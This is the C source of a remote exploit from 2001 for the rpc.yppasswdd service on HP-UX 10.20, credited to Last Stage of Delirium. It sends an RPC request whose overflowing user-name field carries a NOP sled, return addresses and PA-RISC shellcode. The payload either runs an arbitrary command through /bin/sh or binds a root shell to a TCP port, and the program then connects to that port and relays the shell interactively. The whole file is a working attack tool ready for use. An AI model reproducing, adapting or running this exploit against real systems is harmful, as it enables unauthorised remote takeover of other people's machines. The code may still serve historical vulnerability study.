/*## copyright LAST STAGE OF DELIRIUM may 2001 poland        *://lsd-pl.net/ #*/
/*## rpc.yppasswdd                                                           #*/

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <rpc/rpc.h>
#include <netdb.h>
#include <stdio.h>
#include <errno.h>

#define ADRNUM 2000
#define NOPNUM 3000
#define TMPNUM 1500
#define ALIGN  1  

#define YPPASSWDPROG 100009
#define YPPASSWDVERS 1
#define YPUPDATE     1

char cmdshellcode[]= 
    "\xeb\x5f\x1f\xfd"     /* bl      <cmdshellcode+4>,%r26  */
    "\x20\x20\x08\x01"     /* ldil    L%0xc0000004,%r1       */
    "\xb7\x5a\x40\x5a"     /* addi,<  0x2d,%r26,%r26         */
    "\xb7\x56\x40\x10"     /* addi,<  0x8,%r26,%r22          */
    "\xb7\x55\x40\x18"     /* addi,<  0xc,%r26,%r21          */
    "\x0f\x40\x12\x0e"     /* stbs    %r0,0x7(%r26)          */
    "\x0f\x40\x12\x14"     /* stbs    %r0,0xa(%r26)          */
    "\x6b\x5a\x3f\x99"     /* stw     %r26,-0x34(%r26)       */
    "\x6b\x56\x3f\xa1"     /* stw     %r22,-0x30(%r26)       */
    "\x6b\x55\x3f\xa9"     /* stw     %r21,-0x2c(%r26)       */
    "\x6b\x40\x3f\xb1"     /* stw     %r0, -0x28(%r26)       */
    "\xb7\x59\x47\x99"     /* addi,<  -0x34,%r26,%r25        */
    "\xe4\x20\xe0\x08"     /* ble     R%0xc0000004(%sr7,%r1) */
    "\xb4\x16\x70\x16"     /* addi,>  0x0b,%r0,%r22          */
    "/bin/sh -c  "
;

char bindsckcode[]=
    "\xb4\x17\x40\x04"     /* addi,<  0x2,%r0,%r23           */
    "\xe9\x97\x40\x02"     /* blr,n   %r23,%r12              */
    "\x20\x20\x08\x01"     /* ldil    L%0xc0000004,%r1       */
    "\xe4\x20\xe0\x08"     /* ble     R%0xc0000004(%sr7,%r1) */
    "\x0a\xf7\x02\x97"     /* xor     %r23,%r23,%r23         */
    "\xe8\x40\xc0\x02"     /* bv,n    0(%rp)                 */
    "\x61\x02\x23\x45"  
    "\xb4\x1a\x40\x04"     /* addi,<  0x2,%r0,%r26           */
    "\xb4\x19\x40\x02"     /* addi,<  0x1,%r0,%r25           */
    "\xb4\x18\x40\x0c"     /* addi,<  0x6,%r0,%r24           */
    "\xe8\x5f\x1f\xad"     /* bl      .-36,%rp               */
    "\xb4\x16\x72\x44"     /* addi,>  0x122,%r0,%r22         */
    "\x08\x1c\x06\x0d"     /* add     %ret0,%r0,%r13         */
    "\xb5\x8c\x40\x10"     /* addi,<  0x8,%r12,%r12          */
    "\xb4\x18\x40\x20"     /* addi,<  0x10,%r0,%r24          */
    "\x08\x0d\x06\x1a"     /* add     %r13,%r0,%r26          */
    "\x0d\x80\x12\x8a"     /* stw     %r0,0x5(%r12)          */
    "\xb5\x99\x40\x02"     /* addi,<  0x1,%r12,%r25          */
    "\xe8\x5f\x1f\x6d"     /* bl      .-68,%rp               */
    "\xb4\x16\x72\x28"     /* addi,>  0x114,%r0,%r22         */
    "\x08\x0d\x06\x1a"     /* add     %r13,%r0,%r26          */
    "\xb4\x19\x40\x02"     /* addi,<  0x1,%r0,%r25           */
    "\xe8\x5f\x1f\x4d"     /* bl      .-84,%rp               */
    "\xb4\x16\x72\x32"     /* addi,>  0x119,%r0,%r22         */
    "\x08\x0d\x06\x1a"     /* add     %r13,%r0,%r26          */
    "\x0b\x39\x02\x99"     /* xor     %r25,%r25,%r25         */
    "\x0b\x18\x02\x98"     /* xor     %r24,%r24,%r24         */
    "\xe8\x5f\x1f\x25"     /* bl      .-104,%rp              */
    "\xb4\x16\x72\x26"     /* addi,>  0x113,%r0,%r22         */
    "\xb4\x0e\x40\x04"     /* addi,<  0x2,%r0,%r14           */
    "\x08\x1c\x06\x0c"     /* add     %ret0,%r0,%r12         */
    "\x08\x0c\x06\x1a"     /* add     %r12,%r0,%r26          */
    "\x08\x0e\x06\x19"     /* add     %r14,%r0,%r25          */
    "\xe8\x5f\x1e\xf5"     /* bl      .-128,%rp              */
    "\xb4\x16\x70\xb4"     /* addi,>  0x5a,%r0,%r22          */
    "\x88\x0e\x3f\xd5"     /* combf,= %r14,%r0,.-16          */
    "\xb5\xce\x07\xff"     /* addi    -0x1,%r14,%r14         */
;

char shellcode[]=
    "\xeb\x5f\x1f\xfd"     /* bl      .+4,%r26               */
    "\x0b\x39\x02\x99"     /* xor     %r25,%r25,%r25         */
    "\xb7\x5a\x40\x22"     /* addi,<  0x11,%r26,%r26         */
    "\x0f\x40\x12\x0e"     /* stbs    %r0,7(%r26)            */
    "\x20\x20\x08\x01"     /* ldil    L%0xc0000004,%r1       */
    "\xe4\x20\xe0\x08"     /* ble     R%0xc0000004(%sr7,%r1) */
    "\xb4\x16\x70\x16"     /* addi,>  0xb,%r0,%r22           */
    "/bin/sh"
;

static char nop[]="\x0a\xf7\x02\x97";

struct yppasswd{char *oldpass;char *pw_name;};
typedef struct yppasswd yppasswd;

bool_t xdr_yppasswd(XDR *xdrs,yppasswd *objp){
    if(!xdr_string(xdrs,&objp->oldpass,~0)) return(FALSE);
    if(!xdr_string(xdrs,&objp->pw_name,~0)) return(FALSE);
    return(TRUE);
}

main(int argc,char **argv){
    char buffer[16000],address[4],tmp[4],*b,*cmd;
    int i,c,n,port=44444,rpcport=0,sck,srvsck,flag=0,vers=10;
    CLIENT *cl;enum clnt_stat stat;
    struct hostent *hp;
    struct sockaddr_in adr;
    struct timeval tm={10,0};
    fd_set readfs;
    struct yppasswd req;

    printf("copyright LAST STAGE OF DELIRIUM may 2001 poland  //lsd-pl.net/\n");
    printf("rpc.yppasswdd for HP-UX 10.20\n");

    if(argc<2){
        printf("usage: %s address [-s|-c command] [-p port] [-r rpcport][-e]\n",
            argv[0]);
        exit(-1);
    }

    while((c=getopt(argc-1,&argv[1],"sc:p:r:e"))!=-1){
	switch(c){
	case 's': flag|=2;break;
	case 'c': flag|=1;cmd=optarg;break;
	case 'p': port=atoi(optarg);break;
	case 'r': rpcport=atoi(optarg);break;
	case 'e': flag|=4;
	}
    }

    if(vers==10) { 
      *(unsigned long*)address=htonl(0x7b03db58-5000);
      *(unsigned long*)tmp=htonl(0x7b03e2c8);
    }
    printf("adr=0x%08x timeout=%d ",ntohl(*(unsigned long*)tmp),tm.tv_sec);
    fflush(stdout);
    b=buffer;

    if(flag&1){
        if(flag&4) for(i=0;i<ALIGN;i++) *b++=0x61;
        for(i=0;i<TMPNUM;i++) *b++=tmp[i%4];
        for(i=0;i<ADRNUM;i++) *b++=address[i%4];
        for(i=0;i<NOPNUM;i++) *b++=nop[i%4];
        for(i=0;i<strlen(cmdshellcode);i++) *b++=cmdshellcode[i];
        for(i=0;i<strlen(cmd);i++) *b++=cmd[i];
        *b++=';';
    }

    if(flag&2){
        bindsckcode[26]=(unsigned char)((port&0xff00)>>8);
        bindsckcode[27]=(unsigned char)(port&0xff);

        if(flag&4) for(i=0;i<ALIGN;i++) *b++=0x61;
        for(i=0;i<TMPNUM;i++) *b++=tmp[i%4];   
        for(i=0;i<ADRNUM;i++) *b++=address[i%4];
        for(i=0;i<NOPNUM;i++) *b++=nop[i%4];
        for(i=0;i<strlen(bindsckcode);i++) *b++=bindsckcode[i];
        for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i];
    }
    *b++=0;

    req.oldpass=NULL;
    req.pw_name=buffer;

    adr.sin_family=AF_INET;
    adr.sin_port=htons(rpcport);
    if((adr.sin_addr.s_addr=inet_addr(argv[1]))==-1){
	if((hp=gethostbyname(argv[1]))==NULL){
	    errno=EADDRNOTAVAIL;perror("\nerror");exit(-1);
        }
	memcpy(&adr.sin_addr.s_addr,hp->h_addr,4);
    }else{
       if((hp=gethostbyaddr((char*)&adr.sin_addr.s_addr,4,AF_INET))==NULL){
	   errno=EADDRNOTAVAIL;perror("\nerror");exit(-1);
       }
    }

    sck=RPC_ANYSOCK;
    if(!(cl=clntudp_create(&adr,YPPASSWDPROG,YPPASSWDVERS,tm,&sck))){
	 clnt_pcreateerror("\nerror");exit(-1);
    }
    stat=clnt_call(cl,YPUPDATE,(xdrproc_t)xdr_yppasswd,(char*)&req,xdr_void,NULL,tm);
    printf(" sent!\n");
    if(stat==RPC_SUCCESS){
	 printf("not vulnerable!\n"); 
         clnt_destroy(cl); exit(-1);
    }
    if(flag&2){
         srvsck=socket(AF_INET,SOCK_STREAM,0);
         adr.sin_port=htons(port);
         sleep(1);
         if(connect(srvsck,(struct sockaddr *)&adr,sizeof(adr))<0){
	     perror("error");exit(-1);
         } 
         write(srvsck,"/bin/uname -a\n",14);
         fflush(stdout);

	 while(1){
	     FD_ZERO(&readfs);
	     FD_SET(0,&readfs);
	     FD_SET(srvsck,&readfs);
	     if(select(FD_SETSIZE,&readfs,NULL,NULL,NULL)){
	         int cnt;
	         char buf[1024];
	         if(FD_ISSET(0,&readfs)){
		     if((cnt=read(0,buf,1024))<1){
		         if(errno==EWOULDBLOCK||errno==EAGAIN) continue;
		         else break;
                     }
		     write(srvsck,buf,cnt);
                 }
	         if(FD_ISSET(srvsck,&readfs)){
		     if((cnt=read(srvsck,buf,1024))<1){
		         if(errno==EWOULDBLOCK||errno==EAGAIN) continue;
	                 else break;
                     }
		     write(1,buf,cnt);
                }
           }
       }
   }
}

